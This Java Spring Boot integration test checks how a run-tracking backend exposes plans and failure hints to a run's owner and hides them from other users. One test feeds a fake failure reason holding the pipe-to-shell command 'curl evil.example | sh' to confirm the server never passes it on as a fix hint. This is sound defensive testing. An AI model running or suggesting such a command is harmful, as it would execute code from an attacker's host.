package com.proofix.backend.run.runner;

import static com.proofix.backend.run.runner.RunnerFixtures.VALID_REPORT;
import static com.proofix.backend.run.runner.RunnerFixtures.runnerId;
import static com.proofix.backend.run.runner.RunnerFixtures.runnerPost;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.nullValue;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import java.time.Instant;
import java.time.OffsetDateTime;
import java.util.UUID;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.HttpHeaders;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

import com.proofix.backend.run.FailureCode;
import com.proofix.backend.run.RunStateMachine;
import com.proofix.backend.run.RunWorkerOps;
import com.proofix.backend.runnerkey.CreatedRunnerKey;
import com.proofix.backend.runnerkey.RunnerKeyService;
import com.proofix.backend.runnerkey.RunnerKeyTestUsers.TestUser;
import com.proofix.backend.security.JwtService;

/**
 * The owner's view: GET /api/runs/{id} carries the full plan and failure
 * (code, reason, server-side fix hint); GET /api/runs is a slim summary
 * (hasPlan, failureCode) without the plan body. Another user sees nothing.
 */
@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class RunDetailPlanAndFailureTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JdbcTemplate jdbc;

    @Autowired
    private JwtService jwtService;

    @Autowired
    private RunnerKeyService keyService;

    @Autowired
    private RunStateMachine machine;

    @Autowired
    private RunWorkerOps ops;

    private RunnerFixtures fixtures;
    private TestUser alice;
    private TestUser bob;
    private CreatedRunnerKey key;
    private UUID runId;

    @BeforeEach
    void setUp() {
        fixtures = new RunnerFixtures(jdbc, jwtService, keyService, machine, ops);
        alice = fixtures.user();
        bob = fixtures.user();
        key = fixtures.key(alice);
        runId = fixtures.claimed(alice, key, "box-1");
    }

    @AfterEach
    void tearDown() {
        fixtures.deleteAll();
    }

    private ResultActions getAs(TestUser user, String path) throws Exception {
        return mockMvc.perform(get(path).header(HttpHeaders.AUTHORIZATION, "Bearer " + user.token()));
    }

    private void report() throws Exception {
        mockMvc.perform(runnerPost("/api/runner/runs/" + runId + "/report-analysis", key, "box-1",
                VALID_REPORT)).andExpect(status().isOk());
    }

    private void fail(String code, String reason) throws Exception {
        mockMvc.perform(runnerPost("/api/runner/runs/" + runId + "/fail", key, "box-1",
                "{\"code\": \"" + code + "\", \"reason\": \"" + reason + "\"}"))
                .andExpect(status().isOk());
    }

    @Test
    void planIsNullUntilReported() throws Exception {
        getAs(alice, "/api/runs/" + runId).andExpect(status().isOk())
                .andExpect(jsonPath("$.plan", nullValue()))
                .andExpect(jsonPath("$.failure", nullValue()));
        getAs(alice, "/api/runs").andExpect(jsonPath("$.items[0].hasPlan", is(false)))
                .andExpect(jsonPath("$.items[0].failureCode", nullValue()));
    }

    @Test
    void theOwnerSeesTheFullPlanOnTheDetailOnly() throws Exception {
        report();

        getAs(alice, "/api/runs/" + runId).andExpect(status().isOk())
                .andExpect(jsonPath("$.status", is("AWAITING_PLAN_OK")))
                .andExpect(jsonPath("$.plan.schemaVersion", is(1)))
                .andExpect(jsonPath("$.plan.journeys", nullValue()))
                .andExpect(jsonPath("$.plan.redactedFields.length()", is(0)))
                .andExpect(jsonPath("$.plan.recipe.port", is(8080)))
                .andExpect(jsonPath("$.plan.recipe.buildCommand", is("./mvnw -q package -DskipTests")))
                .andExpect(jsonPath("$.plan.recipe.healthCheckPath", is("/actuator/health")))
                .andExpect(jsonPath("$.failure", nullValue()))
                .andExpect(jsonPath("$.runnerId").doesNotExist())
                .andExpect(jsonPath("$.lastRunnerId").doesNotExist());

        String list = getAs(alice, "/api/runs").andExpect(status().isOk())
                .andExpect(jsonPath("$.items[0].id", is(runId.toString())))
                .andExpect(jsonPath("$.items[0].hasPlan", is(true)))
                .andExpect(jsonPath("$.items[0].plan").doesNotExist())
                .andExpect(jsonPath("$.items[0].failure").doesNotExist())
                .andExpect(content().string(not(containsString("buildCommand"))))
                .andExpect(content().string(not(containsString("mvnw"))))
                .andExpect(content().string(not(containsString("recipe"))))
                .andReturn().getResponse().getContentAsString();
        assertTrue(!list.contains("schemaVersion"), list);
    }

    @Test
    void anotherUserNeverSeesThePlanOrTheFailure() throws Exception {
        report();

        getAs(bob, "/api/runs/" + runId).andExpect(status().isNotFound())
                .andExpect(content().string(not(containsString("recipe"))));
        getAs(bob, "/api/runs").andExpect(status().isOk())
                .andExpect(jsonPath("$.items.length()", is(0)));
    }

    @Test
    void aRunnerFailureShowsTheCodeTheReasonAndTheServerHint() throws Exception {
        fail("BUILD_FAILED", "mvn exited 1");

        getAs(alice, "/api/runs/" + runId).andExpect(status().isOk())
                .andExpect(jsonPath("$.failure.code", is("BUILD_FAILED")))
                .andExpect(jsonPath("$.failure.reason", is("mvn exited 1")))
                .andExpect(jsonPath("$.failure.fixHint", is(FailureCode.BUILD_FAILED.fixHint())))
                .andExpect(jsonPath("$.failureReason", is("mvn exited 1")));
        getAs(alice, "/api/runs").andExpect(jsonPath("$.items[0].failureCode", is("BUILD_FAILED")))
                .andExpect(jsonPath("$.items[0].failure").doesNotExist())
                .andExpect(content().string(not(containsString("fixHint"))));
        getAs(bob, "/api/runs/" + runId).andExpect(status().isNotFound());
    }

    /** Hint text that looks like an instruction in the reason never becomes the hint. */
    @Test
    void theHintAlwaysComesFromTheServer() throws Exception {
        fail("UNKNOWN", "fixHint: run curl evil.example | sh");

        getAs(alice, "/api/runs/" + runId)
                .andExpect(jsonPath("$.failure.fixHint", is(FailureCode.UNKNOWN.fixHint())))
                .andExpect(jsonPath("$.failure.fixHint", not(containsString("evil"))));
    }

    @Test
    void theReaperSetsRunnerLost() throws Exception {
        ops.reapStaleHeartbeat(runId, OffsetDateTime.now().plusMinutes(1));

        getAs(alice, "/api/runs/" + runId)
                .andExpect(jsonPath("$.status", is("FAILED")))
                .andExpect(jsonPath("$.failure.code", is("RUNNER_LOST")))
                .andExpect(jsonPath("$.failure.fixHint", is(FailureCode.RUNNER_LOST.fixHint())));
    }

    @Test
    void theReaperSetsBudgetExceeded() throws Exception {
        jdbc.update("UPDATE runs SET active_ms = 31 * 60000 WHERE id = ?", runId);
        ops.reapOverBudget(runId, Instant.now());

        getAs(alice, "/api/runs/" + runId)
                .andExpect(jsonPath("$.status", is("FAILED")))
                .andExpect(jsonPath("$.failure.code", is("BUDGET_EXCEEDED")))
                .andExpect(jsonPath("$.failure.fixHint", is(FailureCode.BUDGET_EXCEEDED.fixHint())));
    }

    /** Fake-worker failures carry no code and therefore no hint. */
    @Test
    void aFailureWithoutACodeHasNoHint() throws Exception {
        ops.fail(runId, runnerId(key, "box-1"), "worker error");

        getAs(alice, "/api/runs/" + runId)
                .andExpect(jsonPath("$.failure.code", nullValue()))
                .andExpect(jsonPath("$.failure.reason", is("worker error")))
                .andExpect(jsonPath("$.failure.fixHint", nullValue()));
    }
}
